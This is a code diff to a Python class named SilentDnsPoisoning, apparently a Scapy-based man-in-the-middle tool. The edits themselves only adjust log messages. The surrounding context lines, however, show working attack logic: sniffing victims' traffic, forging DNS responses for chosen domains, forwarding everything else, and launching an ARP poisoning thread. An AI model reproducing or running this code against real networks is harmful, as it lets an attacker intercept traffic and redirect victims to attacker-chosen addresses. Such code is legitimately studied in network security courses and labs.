@@ -36,7 +36,7 @@ class SilentDnsPoisoning:
                                     # if we find a matching link do not resend the packet to its true receiver
                                     # but make a fake response query
                                     if link in pkt[DNS].qd.qname:
-                                        print("{} wants to connect to {} ".format(pkt[IP].src, link))
+                                        print("{} wants to connect to {} .".format(pkt[IP].src, link))
                                         linkPresent = True
                                         fakeEther = Ether(src=pkt[Ether].src, dst=oldEtherSource)
                                         # for a response revert destination and source
@@ -50,18 +50,18 @@ class SilentDnsPoisoning:
                                         poisonPacket = fakeEther / fakeIP / fakeUDP / fakeDNS
                                         # send the poison packet to the victim
                                         sendp(poisonPacket, verbose=0, iface=interface)
-                                        print("Fake DNS response sent to {} ".format(poisonPacket[IP].dst))
+                                        print("Fake DNS response sent to {} .".format(poisonPacket[IP].dst))
                                         break
                                 if linkPresent == False:
-                                    print("Redirecting traffic from {} to {} ".format(pkt[IP].src, pkt[IP].dst))
+                                    print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                                     # No link match -> resend the DNS request to its true receiver
                                     sendp(pkt, iface=interface)
                             else:
-                                print("Redirecting traffic from {} to {} ".format(pkt[IP].src, pkt[IP].dst))
+                                print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                                 # This is not a DNS request -> resend the packet to its true receiver
                                 sendp(pkt, iface=interface)
                         else:
-                            print("Redirecting traffic from {} to {} ".format(pkt[IP].src, pkt[IP].dst))
+                            print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                             # Packet doesn't have DNS layer -> resend the packet to its true receiver
                             sendp(pkt, iface=interface)
                 # same but with source target 2
@@ -70,7 +70,7 @@ class SilentDnsPoisoning:
                     receiver = pkt[IP].dst
                     for i in range(len(target1)):
                         if receiver == target1[i]:
-                            print("Redirecting traffic from {} to {} ".format(pkt[IP].src, pkt[IP].dst))
+                            print("Redirecting traffic from {} to {} .".format(pkt[IP].src, pkt[IP].dst))
                             pkt[Ether].src = pkt[Ether].dst
                             pkt[Ether].dst = target1MAC[i]
                             found = True
@@ -85,9 +85,10 @@ class SilentDnsPoisoning:
             arpSpoof.daemon = True
             arpSpoof.start()
         except:
-            print("Thread 'arp poisoning' failed to start")
+            print("Thread 'arp poisoning' failed to start.")
 
         while not stop_event.is_set():
             sniff(count=1, store=0,
                   prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison,
                                                  self.interface), iface=self.interface)
+        print("DNS poisoning is stopped.")
